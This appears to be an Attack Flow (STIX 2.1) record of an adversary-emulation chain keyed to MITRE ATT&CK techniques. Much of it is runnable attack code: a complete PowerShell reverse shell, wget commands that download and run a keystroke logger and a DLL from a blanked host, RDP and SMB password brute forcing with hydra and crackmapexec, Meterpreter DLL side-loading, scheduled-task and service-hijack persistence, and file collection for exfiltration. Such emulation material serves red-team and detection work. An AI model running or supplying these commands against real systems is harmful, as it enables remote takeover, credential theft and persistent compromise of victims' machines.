objects.name: Attack Flow
objects.description: Extends STIX 2.1 with features to create Attack Flows.

external_references.description: Source code repository for Attack Flow

objects.description: get_reverse_shell_windows => $LHOST = ""; $LPORT = 9595; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write($Output); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

objects.name: T1566.001
objects.description: Give remote shell under non-privileged account(run .ps1 => reverse shell)

objects.command_line: # Execution not required for this action, only set up.

objects.name: T1016
objects.description: System Network Configuration Discovery on Windows

objects.command_line: dir /s c:\ >> T1083_cmd_text.txt ;dir /s "c:\Documents and Settings" >> T1083_cmd_text.txt ;dir /s "c:\Program Files\" >> T1083_cmd_text.txt ;dir "%systemdrive%\Users\*.*" >> T1083_cmd_text.txt ;dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> T1083_cmd_text.txt ;dir "%userprofile%\Desktop\*.*" >> T1083_cmd_text.txt ;tree /F >> T1083_cmd_text.txt ;dir c:\

objects.name: T1552.001
objects.description: Extract Browser and System credentials with LaZagne

objects.command_line: wget http:///Get-Keystrokes.ps1 -OutFile Get-Keystrokes.ps1; powershell.exe -windowstyle hidden -file Get-Keystrokes.ps1

objects.name: T1003.005
objects.description: List credentials currently stored on the host via the built-in Windows utility cmdkey.exe

objects.name: T1059.001: Command and Scripting Interpreter, PowerShell
T1027.005: Obfuscated Files or Information: Indicator Removal from Tools
T1204.002
objects.description: Run MSFVenom generated payload to get meterpreter session

objects.name: T1574.002
objects.description: DLL Side-Loading using the dotnet startup hook environment variable through meterpreter session

objects.command_line: tmux send-keys -t metasploit_handler 'upload C:\\Program Files\\dotnet\\T1574_002.dll' C-m ;tmux send-keys -t metasploit_handler 'execute -f powershell.exe -Command "set DOTNET_STARTUP_HOOKS=C:\\Program Files\\dotnet\\T1574_002.dll"' C-m ;tmux send-keys -t metasploit_handler 'execute -f dotnet -h > nul' C-m ;tmux send-keys -t metasploit_handler 'execute f powershell.exe -Command "echo 1"' C-m

objects.name: T1018
objects.description: List servers in domain Metasploit enum_ad_computers

objects.name: T1049
objects.description: List TCP connections Metasploit post tcpnetstat

objects.command_line: head -n 40 /usr/share/wordlists/rockyou.txt > pass.list ;echo "2138" >> pass.list ;crackmapexec rdp -u root -p pass.list 10.0.0.10 --rdp-timeout 2 ;hydra -l root -P pass.list rdp://10.0.0.10
crackmapexec smb 10.0.0.10 ;crackmapexec smb -u '' -p '' 10.0.0.10 ;crackmapexec smb -u 'root' -p '' 10.0.0.10 ;hydra -l root -P pass.list smb://10.0.0.10

objects.name: T1021.001
objects.description: Attempt an RDP session via Remote Desktop Application to a DomainController thourgh first target host

objects.name: T1136.001
objects.description: Create a new local user in PowerShell

objects.name: T1053.005
objects.description: Add binary to run on startup

objects.command_line: schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe" ;schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"

objects.name: T1136.001
objects.description: Create a new local user in PowerShell

objects.command_line: reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f ;reg add HKEY_CURRENT_USER\Software\APTSimulator ewSetting /v T1112Test /t REG_SZ /d "T1112Test" /f

objects.name: T1543.003
objects.description: Modify default Fax by changing the binPath to PowerShell to spawn powershell.

objects.command_line: sc config Fax binPath="C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\"" ;sc start Fax

objects.name: T1005
objects.description: Search files of interest and save them to a single zip file and exfiltrate

objects.name: T1048.003: Exfiltration Over Alternative Protocol, Exfiltration Over Unencrypted Non-C2 Protocol

objects.command_line: wget http:///T1218_011.dll -OutFile T1218_011.dll; rundll32.exe T1218_011.dll,krnl; del T1218_011.dll
